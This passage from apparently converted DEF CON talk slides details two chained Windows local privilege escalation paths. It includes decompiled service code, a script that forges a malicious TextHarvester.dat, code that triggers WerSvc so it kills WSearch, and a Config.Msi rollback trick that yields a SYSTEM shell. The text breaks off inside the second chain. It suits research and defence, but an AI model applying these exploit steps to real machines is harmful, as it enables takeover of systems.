---
title: "Chaining Logical Bugs for Reliable Windows LPE"
speakers: ["Bocheng Xiang", "HeeChan Kim"]
conference: "DEF CON"
conference_full: "DEF CON 34"
edition: "34"
year: 2026
source_pdf: "DEF CON 34/DEF CON 34 - Bocheng Xiang, HeeChan Kim - Chaining Logical Bugs for Reliable Windows LPE - v1.pdf"
pages: 80
sha256: "6be02a3601beeb3f3831590ff9711c6b2f392d8aaf14d879013191cbbe9a6d1f"
text_chars: 57003
ocr_pages: 0
has_ocr: false
redacted_secrets: 0
ocr_confidence: null
ocr_unreliable_blocks: 0
vision_verified_pages_changed: 73
vision_verified_pages: 80
ocr_timeouts: 0
pages_recovered_from_text_layer: 0
companion_files: []
extractor: "pymupdf4llm 1.28.2"
converted_at: "2026-08-12T06:23:01Z"
---
# Chaining Logical Bugs for Reliable Windows LPE

**Speakers:** Bocheng Xiang, HeeChan Kim  
**Conference:** DEF CON 34  
**Source:** `DEF CON 34/DEF CON 34 - Bocheng Xiang, HeeChan Kim - Chaining Logical Bugs for Reliable Windows LPE - v1.pdf` (80 pages)


## Slide 1

```
DEF CON 34  ·  MAIN STAGE  ·  LAS VEGAS
```

# **Chaining Logical Bugs for Reliable Windows LPE**

_Turning “that’s probably low impact” into a working SYSTEM exploit._

```
heegong@defcon: ~
```

**HeeChan Kim** `@heegong123` TeamH4C  ·  Soongsil University

```
C:\Users\heegong> whoami
nt authority\system
```

```
DeleteFileW()   ZwCreateKey()   SHDeleteKeyW()   OBJ_FORCE_ACCESS_CHECK   Performance\Library   S-1-5-18
```

```
01
```

## Slide 2

###### **`C:\> whoami /researcher`**

### **whoami**

**HeeChan Kim** `@heegong123` Windows LPE & logic-bug researcher — I turn bugs Microsoft rates **“low”** into **SYSTEM**.

```
// career
```

- **`POC 2025`** speaker — Full-Chain Windows LPE

- **`RE//verse 2026`** speaker

- **`DEF CON 33 CTF`** finalist · Maple Mallard Magistrates

- **`MSRC`** acknowledged · multiple Windows CVEs

```
heegong@defcon: ~/whoami
```

```
PS C:\> whoami /all

GROUPS
  Windows Internals    On
  Logic Bug Enjoyer    On
  Reads Config.Msi 4Fun On

PRIVILEGES
  SeChainBugsPrivilege On
  SeSymlinkPrivilege   On
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
02
```

## Slide 3

```
C:\> type agenda.txt
```

#### **Agenda**

**`01`** **Background & the primitive mindset** `why a “not exploitable” bug can still get you SYSTEM`

**`02`** **Chain #1 · Service-level LPE** `two service bugs, useless on their own  → SYSTEM`

**`03`** **Chain #2 · Kernel + task LPE** `a kernel bug + a scheduled-task bug  → SYSTEM`

**`04`** **Patches  ·  scoreboard  ·  takeaways** `how each chain dies — why you can’t just route around the fix`

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
03
```

## Slide 4

**`C:\> cd .\background` Background**

_Why logic bugs quietly win — and how to read a bug like an attacker._

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
04
\```

## Slide 5

```
C:\> id   #  standard user · no admin
```

**The gap we cross — user → SYSTEM**

_No UAC prompt. No shellcode, ROP, or spray — we climb it with logic alone._

**Standard user**
Medium IL · no admin · no UAC

privilege boundary

**SYSTEM**
NT AUTHORITY\SYSTEM · full control

The classic path across it got expensive. **Two “low-impact” bugs, chained, are all it takes.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
05
```

## Slide 6

```
C:\> dir .\mitigations\
```

**Memory corruption got expensive** _A decade of mitigations raised the cost of the classic path._

- CFG / XFG
- CET shadow stack
- kCFG
- VBS / HVCI
- Kernel CFG
- Type isolation
- Arb-write hardening
- Pool hardening

Meanwhile, a quieter bug class shrugs all of it off: **logic flaws in privileged components**

No ROP. No infoleak. No spray. Just Windows components trusting the wrong string, handle, or registry key.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
06
```

## Slide 7

###### **`C:\> why_logic_bugs.md`**

###### **Why attackers love logic bugs**

STABLE

**Highly stable**

No addresses, no races to lose. It just works.

PORTABLE

**Architecture-independent** x64, ARM64, next year’s build — same bug.

DURABLE

**Resilient to code changes** Survives refactors that break memory bugs.

STICKY

**Hard to patch for good** First fixes get bypassed — repeatedly.

And they pay: **`Windows LPE bounties $2k–$20k+`** — a reliable SYSTEM primitive is worth real money.

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
07
\```

## Slide 8

###### **`C:\> think_in_primitives.md`**

###### **Think in primitives, not exploits**

_A privileged bug rarely hands you a shell — it hands you one primitive to aim._

###### **Arbitrary file delete**

as SYSTEM · target you pick

**Arbitrary registry write** create / delete a SYSTEM key

**Arbitrary process kill** terminate any PID as SYSTEM

**Arbitrary file write** drop bytes into a SYSTEM path

Each one, on its own, gets triaged **“low-sev / won’t fix”** — no code exec, no direct EoP. So MSRC shrugs, and the bug lives on.

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
08
\```

## Slide 9

###### **`C:\> what_if.sh`**

**What if you mix two “not exploitable” bugs?** _Neither is a vulnerability alone. Chained, they become a deterministic SYSTEM primitive._

**Primitive A**
a bug marked “won’t fix”

**+**

**Primitive B**
another “won’t fix” bug

→

**CHAIN**
one feeds the next

→

**SYSTEM**
deterministic · no ROP, no spray

Every step is a Windows feature working **as designed** — just never meant to run together.  This talk = **`2 chains, 4 bugs, 0 memory corruption.`**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
09
```

## Slide 10

**`C:\> .\chain1\run.exe` Chain #1  ·  Service-Level LPE** _Two service bugs, useless alone — chained into deterministic SYSTEM._

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
10
\```

## Slide 11

```
C:\> sc query WSearch
```

###### **Windows Search — CVE-2024-30033**

- **› Windows Search** indexes files & folders box-wide

- **›** Hosted by **SearchIndexer.exe** — runs as **SYSTEM**

- **›** Loads IpsPlugin.dll on startup — the real surface

- **›** Reads a state file from **user-writable** profile dirs

- **›** A SYSTEM service, parsing a file **we fully control**

- **›** What it does with that file is the whole talk →

```
SearchIndexer.exe  (SYSTEM)
```

```
> tasklist /svc | findstr Search
SearchIndexer.exe   WSearch

loads:
   ...\System32\IpsPlugin.dll

reads:
   %LocalAppData%\...\
   TextHarvester\TextHarvester.dat
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
11
```

## Slide 12

###### **`C:\> windbg> bp IpsPlugin!CCommunicationManager::Initialize`**

###### **SearchIndexer.exe — the call flow**

**SearchIndexer!** CSearchService::Start
→ **mssrch!** CSearchService::Start
→ _(frames elided)_ → **mssrch!CPlugin::Init**
→ **IpsPlugin!** CreateGathererDataSink
→ _(frames elided)_ → **CCommunicationManager::Initialize**
→ **CConnectionTable::Load** — reads TextHarvester.dat
→ **CConnectionWaitList::Load** — → DeleteFileW()

Two leaf calls are the **entire** vuln surface — **“if my file parsed, delete my file.”**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
12
```

## Slide 13

###### **`C:\> ida> CCommunicationManager::Initialize`**

###### **Initialize — read, then delete**

```
IpsPlugin.dll  —  CCommunicationManager::Initialize()

1   bool __fastcall CCommunicationManager::Initialize(
2           CCommunicationManager *this, const unsigned __int16 *a2,
3           struct CChannelCreatorBase *a3)
4   {
5     ...
6     v7 = CConnectionTable::Load(this + 48, v4);        // parse .dat
7     if ( v7 )
8       v7 = CConnectionWaitList::Load(this + 384,       // the delete
9                                      v6, this + 48);
10    ...
11  }
```

**`Load`** Parse TextHarvester.dat into a table — must return true.

**`if(v7)`** The delete runs ONLY if the parse fully succeeded. Our whole PoC job: make the parser happy.

**`this+48`** The parsed table (with our UsernamePath) is handed straight to the delete routine.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
13
```

## Slide 14

###### **`C:\> ida> CConnectionTable::Load`**

###### **Open TextHarvester.dat**

```
IpsPlugin.dll  —  CConnectionTable::Load()

1   bool __fastcall CConnectionTable::Load(CConnectionTable *this, ...)
2   {
3     ...
4     CSavedFileHandle::CSavedFileHandle(v12, L"TextHarvester.dat");
5     v3 = CSavedFileHandle::OpenFile(v12, ..., 1u, 3u);   // [1]
6     if ( v3 ) {
7       v5 = (CUserId *)operator new(0xC38ui64);           // record
8       ...
9       v3 = CUserId::Load(v5, (CSavedStateReader *)v12);  // [2]
10    }
11    ...
12  }
```

**`[1]`** Opens the fixed filename TextHarvester.dat — from a directory a normal user can write.

**`new(0xC38)`** Allocates a fresh CUserId to hold the parsed record.

**`[2]`** CUserId::Load streams our file bytes in. Its return becomes the whole function’s return.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
14
```

## Slide 15

```
C:\> hexdump -C TextHarvester.dat
```

###### **The .dat file — one field we control**

_The whole format is just filler around a single attacker-controlled path._

| # | Field | Type | Value |
|---|---|---|---|
| `[1]` | **Header** | 4-byte int == 0xC8 | `0xC8` |
| `[2]` | **SID string** | LPWSTR | `S-1-5-18` |
| `[3]` | **UsernamePath** | LPWSTR — no \ filter | `user\TempData` |
| `[4-8]` | temp strings + bytes | just satisfy the reader | any |
| `[9-11]` | temp dwords + blob | read because header == 200 | 0 … 3 |

**the ONLY field that matters** — our path, spliced in with no filter → traversal

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
15
```

## Slide 16

###### **`C:\> ida> CUserId::Load  (part 1)`**

###### **The header, the SID, and the sink**

```
IpsPlugin.dll  —  CUserId::Load()

1   char __fastcall CUserId::Load(CUserId *this, CSavedStateReader *a2, ...)
2   {
3     if ( !CSavedStateReader::Read(a2, v18, 4u)
4         || v18[0] != 0xC8 && v18[0] != 100 )      // [1] header
5       return 0;
6     LPWSTR = CSecurityID::Load(v5, a2);            // [2] SID
7     if ( !LPWSTR ) return LPWSTR;
8     if ( !CSavedStateReader::ReadLPWSTR(a2, this + 4) ) // [3] UsernamePath
9       return 0;
10    ...   // do/while just measures the string length
11  }
```

**`[1]`** Reject unless the first dword is 0xC8 or 100 — trivial to satisfy.

**`[2]`** Parses a SID string; we hand it S-1-5-18, present on every box.

**`[3]`** Reads UsernamePath straight off disk into this+4 — no backslash filter, no canonicalization. This one line is the whole bug.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
16
```

## Slide 17

###### **`C:\> ida> CUserId::Load  (part 2)`**

###### **Temp fields — all must succeed**

```
IpsPlugin.dll  —  CUserId::Load()

1   LPWSTR = ReadLPWSTR(a2, this + 5);                     // [4] temp str
2   if ( LPWSTR ) {
3     LPWSTR = Read(a2, this + 5, 1u);                     // [5] 1 byte
4     if ( LPWSTR ) {
5       LPWSTR = Read(a2, this + 4, 1u);                   // [6] 1 byte
6       v10 = v18[0];
7       LPWSTR = CIdCache<CEmailDate>::Load(this + 48, a2);   // [7]
8       if ( LPWSTR ) {
9         v11 = COtherItemIdCache::Load(this + 72, a2);     // [8]
10        if ( v10 == 200 && v11 )                          // header 0xC8 forces [9]
11          LPWSTR = CIdCache<CDocumentEntry>::Load(this+104, a2); // [9]
12      }
13      LPWSTR = CSentItemFolderList::Load(this + 128, a2);   // folder list
14      LPWSTR = Read(a2, this, 4u);                        // 4-byte tail
15    }
16  }
```

**`[4-8]`** A string, two bytes, and two length-prefixed caches — send length 0 and they still return true.

**`[9]`** Gated on v10==200: because we chose header 0xC8, this extra dword IS read, so our file must include it.

**`any fail`** One failed read aborts the parse and the delete never fires.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
17
```

## Slide 18

```
C:\> k   #  where are we in the call tree
```

###### **Parse done — into the delete routine**

_Same Initialize, two children: we’ve read the file; now we follow the delete._

**Initialize**
IpsPlugin state-file entry

**CConnectionTable::Load**
✓ parsed — CUserId::Load read the UsernamePath we control

**CConnectionWaitList::Load**
← we go here next: SetUser → PathAppendW → DeleteFileW

The value we planted in the .dat is now handed to the delete path — **a SYSTEM file op we steer.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
18
```

## Slide 19

###### **`C:\> ida> CConnectionWaitList::Load`**

###### **The delete routine**

```
IpsPlugin.dll  —  CConnectionWaitList::Load()

1   bool __fastcall CConnectionWaitList::Load(...)
2   {
3     ...
4     v11 = CUserProfilePathBuilder::SetUser(v14,
5                     *(v9 + 16) + 32);                     // [12] our UsernamePath
6     if ( v11 && CUserProfilePathBuilder::FileExists(v14, v12) ) // [13]
7     {
8       StringCchCopyW(pszPath, 0x104, v10);
9       if ( PathAppendW(pszPath, L"WaitList.dat") )         // [14]
10        DeleteFileW(pszPath);                              // [15] EXPLOIT POINT
11    }
12    ...
13  }
```

**`[12]`** The arg at +32 is our parsed UsernamePath — passed into the path builder unmodified.

**`[13]`** FileExists: soft gate — the path just has to exist. A symlink satisfies it.

**`[14][15]`** PathAppendW tacks WaitList.dat onto our steered path; DeleteFileW then runs as SYSTEM on it. The money line.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
19
```

## Slide 20

###### **`C:\> ida> CUserProfilePathBuilder::SetUser`**

###### **The unsanitized join (the sink)**

```
IpsPlugin.dll  —  CUserProfilePathBuilder::SetUser()

1   bool __fastcall CUserProfilePathBuilder::SetUser(
2           CUserProfilePathBuilder *this, const unsigned __int16 *a2)
3   {
4     ...
5     StringCchPrintfW(
6         v2, 0x104,
7         L"%s\\%s\\%s\\Microsoft\\InputPersonalization\\TextHarvester",
8         *this,          // base profile dir
9         a2,             // [16] = UsernamePath, verbatim from our file
10        s_wszLocalAppDataRelativePath);
11    ...
12  }
```

**`a2`** The second %s is exactly the string we wrote into the .dat, byte for byte.

**`[16]`** StringCchPrintfW does plain substitution — no check that a2 is a single directory name.

**`=>`** Because a2 may contain \ , we extend the path into any directory we own.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
20
```

## Slide 21

###### **`C:\> ida> CUserProfilePathBuilder::FileExists`**

###### **The existence gate (not a security check)**

`IpsPlugin.dll  —  CUserProfilePathBuilder::FileExists()`

```
1  bool __fastcall CUserProfilePathBuilder::FileExists(
2      const unsigned __int16 **this, const unsigned __int16 *a2)
3  {
4    ...
5    StringCchCopyW(pszPath, 0x104, this[1]);   // the attacker-steered dir
6    return PathAppendW(pszPath, L"WaitList.dat")
7      && PathFileExistsW(pszPath);        // must simply exist
8  }
```

**`copy this[1]`** Uses the directory SetUser just built from our UsernamePath.

**`PathFileExistsW`** The delete only proceeds if the path exists — so we drop a WaitList.dat that is actually a symlink.

**`=>`** Once this returns true, control falls straight to DeleteFileW.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
21
```

## Slide 22

```
C:\> dir /a  C:\Users\user\TempData\...
```

###### **The path we get to steer**

```
template
```

```
C:\Users\%UsernamePath%\AppData\Local\...\TextHarvester\WaitList.dat
```

```
benign (single component)
```

```
C:\Users\user\AppData\Local\...\TextHarvester\WaitList.dat
```

```
attacker (\ NOT filtered)
```

```
C:\Users\user\TempData\AppData\Local\...\TextHarvester\WaitList.dat
```

UsernamePath can itself contain **`\`**, so we choose the entire directory chain and land the path in a folder we own at every level. **Now both directories are ours — the classic setup for a symlink swap.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
22
```

## Slide 23

###### **`C:\> mklink  WaitList.dat → license.rtf`**

###### **WaitList.dat → anything you want**

**`SETUP`** Write .dat with **UsernamePath = user\TempData** + mkdir the tree

**`LINK`** Reparse **WaitList.dat** → **C:\Windows\System32\license.rtf**

**`RESULT`** SYSTEM **DeleteFileW** follows the link → deletes **license.rtf**

**Search Service** (SearchIndexer · SYSTEM) —`delete`→ **WaitList.dat** → **license.rtf** (SYSTEM-owned)

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
23
```

## Slide 24

###### **`C:\> python3 make_dat.py   # pip install pwntools`**

###### **PoC — forging TextHarvester.dat**

`make_dat.py`

```
 1  sid  = 'S-1-5-18'.encode('utf-16le') + b'\x00\x00'
 2  user = 'user'.encode('utf-16le') + b'\x00\x00'
 3
 4  data  = p32(0xC8)                # [1] header
 5  data += p32(len(sid)//2) + sid              # [2] SID
 6  data += p32(len(user)//2) + user            # [3] UsernamePath  <- control
 7  data += p32(len(user)//2) + user            # [4] temp string
 8  data += b'\x01' + b'\x02'         # [5][6] temp bytes
 9  data += p32(0) + p32(0)           # [7][8] empty strings
10  data += p32(0)                    # [9] read because header == 0xC8
11  data += p32(0)*5                  # [10] 20-byte blob
12  data += p32(3)                    # [11] tail
13  open('TextHarvester.dat','wb').write(data)
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
24
```

## Slide 25

```
C:\> arbitrary delete → EoP
```

###### **Arbitrary delete is basically SYSTEM**

_The well-known Config.Msi / installer-rollback trick  (h/t ZDI · Abdelhamid Naceri · Wh04m1001)._

- **`1`** Windows Installer (SYSTEM) writes rollback .rbs into C:\Config.Msi

- **`2`** Use the delete primitive to remove the protected C:\Config.Msi

- **`3`** Recreate C:\Config.Msi as us — now we own the ACL

- **`4`** Plant a malicious .rbs that launches cmd.exe

- **`5`** Abort → Installer rolls back → runs OUR .rbs as SYSTEM → shell

```
Config.Msi rollback

delete  C:\Config.Msi
mkdir   C:\Config.Msi
write   evil.rbs

[rollback fires]

C:\> whoami
nt authority\system
```

A background AfdToEop thread starts-then-aborts the install to drive the rollback — **deterministic, no race to win.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
25
```

## Slide 26

```
C:\> sc stop WSearch   →   Access is denied.
```

###### **But… you have to restart WSearch**

The delete only fires when WSearch **(re)starts**. And that’s the whole problem:

- ✗ WSearch is configured auto-start

- ✗ Standard users can’t stop or restart it

- ✗ The PoC “cheats”: restart it by hand

**Limited LPE**

A real bug, not a real weapon. We need to force the restart ourselves → **an arbitrary process-kill.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
26
```

## Slide 27

```
C:\> whoami /groups   # just a normal user
```

###### **The missing piece: a free KILL primitive**

If we could **terminate WSearch on demand**, its auto-start config works in our favor — Windows restarts it for us, and our delete fires **deterministically.**

**DELETE** (arbitrary file) + **KILL** (process termination) = **reliable SYSTEM**

Where do you get a free arbitrary process-kill as a normal user? **Microsoft hands you one, and won’t take it back.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
27
```

## Slide 28

###### **`C:\> zdi> ZDI-24-1098`**

###### **ZDI-24-1098 — WerSvc arbitrary kill**

- **WerSvc** (Windows Error Reporting) runs as **SYSTEM**

- It is **missing an authorization check** before granting access

- A low-priv user names a **target PID** → WerSvc kills it as SYSTEM

- No admin, no **SeDebugPrivilege**, no special group

- Microsoft’s verdict: **“won’t fix”**

- → publicly disclosed and **still unpatched today**

```
ZDI-24-1098 / ZDI-CAN-22870

Missing Authorization →
Arbitrary Process Termination

CVSS  : 5.5  (…/A:H)
Vendor: Microsoft · Windows
Caller: low-priv local user
Impact: terminate ANY pid
Status: won’t fix · UNPATCHED

a free, reusable KILL
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
28
```

## Slide 29

\```
C:\> sc qc WSearch   # START_TYPE : 2  AUTO_START
\```

###### **Why a KILL unlocks Chain #1**

\```
BEFORE
\```

`run exp.exe  →` **`[ wait ??? ]`** `→ WSearch happens to restart  → delete fires` _flaky, slow, depends on luck_

###### **`WITH ZDI-24-1098`**

**`1.`** `drop TextHarvester.dat + WaitList.dat symlink`

**`2.`** `KILL WSearch  (ZDI-24-1098, as a normal user)`

**`3.`** `Open WSearch's COM object → it force-starts as SYSTEM, no waiting`

**`4.`** `CConnectionWaitList::Load → arbitrary DELETE fires on the restart`

\```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
\```

\```
29
\```

## Slide 30

###### **`C:\> sc qtriggerinfo wersvc`**

###### **…but WerSvc isn’t always running**

- WerSvc is startup-type **Manual** (svchost -k WerSvcGroup)

- When stopped → **no ALPC server** to connect to

- A normal user can’t **sc start wersvc** directly

- So how is it meant to start? **sc qtriggerinfo**

- It registers a **CUSTOM ETW start-trigger**

- Emit that provider’s event → SCM starts WerSvc for us

```
sc qtriggerinfo wersvc

C:\> sc qtriggerinfo wersvc
[SC] QueryServiceConfig2 OK

SERVICE_NAME: wersvc
  START SERVICE
    CUSTOM :
    e46eead8-0c54-4489-
    9898-8fa79d059e0e
    [ETW PROVIDER UUID]
```

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
30
```

## Slide 31

###### **`C:\> ida> wer!SignalStartWerSvc`**

###### **The real trigger logic — SignalStartWerSvc**

`wer.dll  —  SignalStartWerSvc()`

```
 1  __int64 SignalStartWerSvc(void)
 2  {
 3    int v1 = 0;
 4    if ( ZwQueryWnfStateNameInformation(
 5          &WNF_WER_SERVICE_START, 1, 0, &v3, 4) >= 0 && v3 )
 6      v1 = ZwUpdateWnfStateData(&WNF_WER_SERVICE_START, 0,0,0,0,0,0) >= 0;
 7    v4 = 0;
 8    if ( !EtwEventWriteNoRegistration(
 9          &WerSvcTriggerGuid, &v4, 0, 0) )    // fire trigger
10      ++v1;
11    if ( !v1 ) return 0xC0000040;
12    return 0;
13  }
```

**`WNF`** Queries then updates the WNF_WER_SERVICE_START state — the WerSvc start signal.

**`ETW write`** EtwEventWriteNoRegistration fires ONE event on WerSvcTriggerGuid — the exact provider sc qtriggerinfo showed. This is what SCM’s custom trigger watches for.

**`=>`** Windows itself calls this to start WerSvc on demand — and none of it needs privilege.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
31
```

## Slide 32

###### **`C:\> ./start_wersvc.exe   (standard user)`**

###### **Reproduce it — start WerSvc yourself**

`start_wersvc  —  emit the ETW trigger`

```
 1  // WNF_WER_SERVICE_START state name (8 bytes)
 2  CHAR wnf[] = { 0x75,0x08,0xBC,0xA3,0x3A,0x0B,0x94,0x41 };
 3  ZwQueryWnfStateNameInformation(wnf, 1, 0, &info, sizeof(info));
 4  ZwUpdateWnfStateData(wnf, 0,0,0,0,0);
 5
 6  GUID g;                              // WerSvc start-trigger provider
 7  g.Data1 = 0xE46EEAD8; g.Data2 = 0x0C54; g.Data3 = 0x4489;
 8  char d4[] = { 0x98,0x98,0x8F,0xA7,0x9D,0x05,0x9E,0x0E };
 9  memcpy(&g.Data4, d4, 8);
10
11  QWORD v4[2] = { 0 };
12  EtwEventWriteNoRegistration(&g, v4, 0, 0); // -> WerSvc RUNNING (SYSTEM)
```

**`WNF`** Poke the WNF_WER_SERVICE_START state, exactly like wer.dll does.

**`GUID`** Rebuild the provider GUID e46eead8-0c54-4489-9898-8fa79d059e0e straight from sc qtriggerinfo.

**`write`** EtwEventWriteNoRegistration writes the trigger event → SCM starts WerSvc as SYSTEM → its ALPC server comes up → the kill is reachable.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
32
```

## Slide 33

###### **`C:\> ida> CHungApp::Report   (requestCode 0x10000000)`**

###### **The kill — where the missing check matters**

`wersvc  —  CHungApp::Report()  (hang-report path)`

```
1  // ALPC requestCode 0x10000000  ->  SvcReportHang
2  CWerService::SvcReportHang(msg);
3    CWerService::TryReportHang(msg);
4      CHangrepServer::ReportHang(msg);
5        CHungApp::Report(msg);
6
7  hProc = OpenProcess(0x100611, FALSE, msg->pid); // attacker-chosen pid
8  // no caller-vs-target PID authorization gate here
9  TerminateProcess(hProc, 0xCFFFFFFF);
```

**`0x10000000`** We connect WerSvc’s ALPC server and send request 0x10000000 with msg->pid = our target.

**`OpenProcess(msg->pid)`** WerSvc opens the PID we supplied — under SYSTEM authority.

**`no check`** So, is there a check for this PID?  No. A low-priv user gets SYSTEM to TerminateProcess any PID.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
33
```

## Slide 34

###### **`C:\> root cause  # why any user can do it`**

###### **Reaching the kill — as a normal user**

_How a low-privilege user reaches a SYSTEM-only terminate, and the one check that is not there._

**normal user** (no admin · no SeDebug) → **start WerSvc** (fire the ETW trigger) → **send hang-report** (ALPC req 0x10000000 + our PID) → **WerSvc kills it** (OpenProcess + Terminate, SYSTEM)

**Root cause:** the hang-report path opens and kills whatever PID the caller sends, and never checks the caller is allowed to touch that process. A SYSTEM terminate with no gate — reachable by anyone.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
34
```

## Slide 35

###### **`C:\> connect  # start it on demand`**

###### **Force-start WSearch — don't wait**

_The kill stops WSearch. Instead of waiting for it to come back, we open its COM object and it starts again at once._

`start_wsearch  —  open the Search Manager`

```
// WSearch is killed — now start it, no waiting
ISearchManager *mgr = nullptr;
CoCreateInstance(CLSID_CSearchManager,
    nullptr, CLSCTX_ALL, IID_ISearchManager,
    (void**)&mgr);

// DCOM starts WSearch as SYSTEM  ->  re-reads
//   our .dat  ->  DeleteFileW fires now
```

**`any user`** Creating this COM object needs no admin rights.

**`DCOM`** Windows starts the WSearch service as SYSTEM to serve the call.

**`no wait`** It re-reads our .dat right away, so the delete fires now, not on a timer.

So the restart is on our schedule, not luck. **Kill, connect, done.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
35
```

## Slide 36

```
C:\> ./chain1.exe   # standard user → SYSTEM
```

###### **Chain #1 — assembled**

_The KILL forces the restart — so the whole chain runs deterministically, every time._

`DETERMINISTIC · the KILL forces the restart`

**1. Plant .dat + symlink** (CVE-2024-30033) → **2. Start WerSvc** (ETW trigger) → **3. KILL WSearch** (ZDI-24-1098) → **4. COM start** (no wait) → **5. DELETE fires** (as SYSTEM) → **6. SYSTEM** (→ shell)

Two “low-impact” service bugs → **a reliable SYSTEM weapon.**

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
36
```

## Slide 37

###### **`C:\> ▶ play  chain1_demo.mp4`**

###### **Demo — Chain #1**

standard user → KILL WSearch → force-start → DELETE → **SYSTEM** (first try)

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
37
```

## Slide 38

###### **`C:\> .\chain2\run.exe`**

###### **Chain #2  ·  Kernel + Task LPE**

_A kernel driver and a SYSTEM scheduled task, tricked into building a registry key we own._

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
38
```

## Slide 39

###### **`C:\> git blame  chain2/`**

###### **Full disclosure — Chain #2 isn’t mine**

_Credit where it’s due before we dig in._

**CHAIN #1**

**Windows Search  +  WerSvc**

CVE-2024-30033 · ZDI-24-1098

my own research

**HeeChan Kim**  @heegong123

**CHAIN #2**

**csc.sys  +  CEIP task**

CVE-2025-60705 · CVE-2025-59512

found & shared — huge thanks

**Tianlin Zhang**  @t0zhang

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
39
```

## Slide 40

###### **`C:\> msrc> CVE-2025-60705  —  Client-Side Caching EoP`**

###### **Chain #2 kernel half — csc.sys**

_Trace ONE file rename from a COM call down to a registry key owned by us._

**user code** (COM client · low priv)

↓

**cscsvc.dll** (SYSTEM COM server)

↓

**csc.sys** (kernel · rdbss mini-rdr)

CSC (Offline Files) caches network shares locally so they survive a dropped connection.

**Three layers. The bug lives at the bottom.**

Keep one fact in mind all the way down: the SYSTEM service **impersonates us** before it starts the work.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
40
```

## Slide 41

###### **`C:\> ida> COfflineFilesService::RenameItem`**

###### **The COM entry — it impersonates us**

**`cscsvc.dll — COfflineFilesService::RenameItem()`**

```
1   __int64 __fastcall COfflineFilesService::RenameItem(
2         COfflineFilesService *this,
3         unsigned __int16 *a2, const unsigned __int16 *a3)
4   {
5     ...
6     v5 = CComImpersonator::Impersonate(v7, a2);    // [1] adopt OUR token
7     if ( v5 >= 0 )
8       v5 = CscLib_RenameItem(a2, a3);              // work, as us
9     CComImpersonator::_RevertToSelf(v7);
10    return v5;
11  }
```

**`[1]`** Before any work, the SYSTEM COM server adopts the calling client’s token — our low-priv token.

**`looks correct`** Impersonate → work → revert is the standard confused-deputy defense. The intent is right.

**`the catch`** The work dips into the kernel, and one kernel call forgets it’s impersonating. That omission is the bug — 8 slides down.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
41
```

## Slide 42

###### **`C:\> ida> cscsvc!CscLib_RenameItem`**

###### **Pack the paths into UNICODE_STRINGs**

**`cscsvc.dll — CscLib_RenameItem()`**

```
1   __int64 __fastcall CscLib_RenameItem(PCWSTR SourceString, PCWSTR a2)
2   {
3     struct _UNICODE_STRING DestinationString;
4     struct _UNICODE_STRING v9;
5     ...
6     RtlInitUnicodeString(&v9, SourceString);              // [2] src
7     RtlInitUnicodeString(&DestinationString, a2);         //     dst
8     if ( CscUmpLibraryState )
9       v4 = CscDriverRebootRenameAddEntry(&v9, &DestinationString);
10    ...
11  }
```

**`[2]`** The two raw wide-string paths are wrapped into kernel UNICODE_STRINGs — both fully attacker-controlled (our COM args).

**`still us`** Still in usermode cscsvc.dll, still impersonating. Pure marshalling before the hand-off to the driver.

```
heegong@defcon:~$  chaining logical bugs for reliable windows LPE
```

```
42
```

## Slide 43

###### **`C:\> ida> cscsvc!CscDriverRebootRenameAddEntry`**

###### **Open the driver, build the FSCTL buffer**

**`cscsvc.dll — CscDriverRebootRenameAddEntry()`**

```
1   v8 = CscDriverpOpenControl(&FileHandle, 0LL);     // [3] open csc
2   if ( v8 >= 0 ) {
3     *(_DWORD *)v7 = 8;
4     *((_DWORD *)v7 + 1) = 52;                 // opcode 52
5     v7[4] = a1->Length;   v7[5] = a2->Length;
6     memcpy(v7 + 6,   a1->Buffer, a1->Length);        // src
7     memcpy(v7 + a1->Length + 12, a2->Buffer, a2->Length); // dst
8     v8 = CscDriverpFsControlEx(FileHandle, ..., v7, v6, 0, 0); // [4]
9   }
```

**`[3]`** Opens a handle to the CSC control device object.

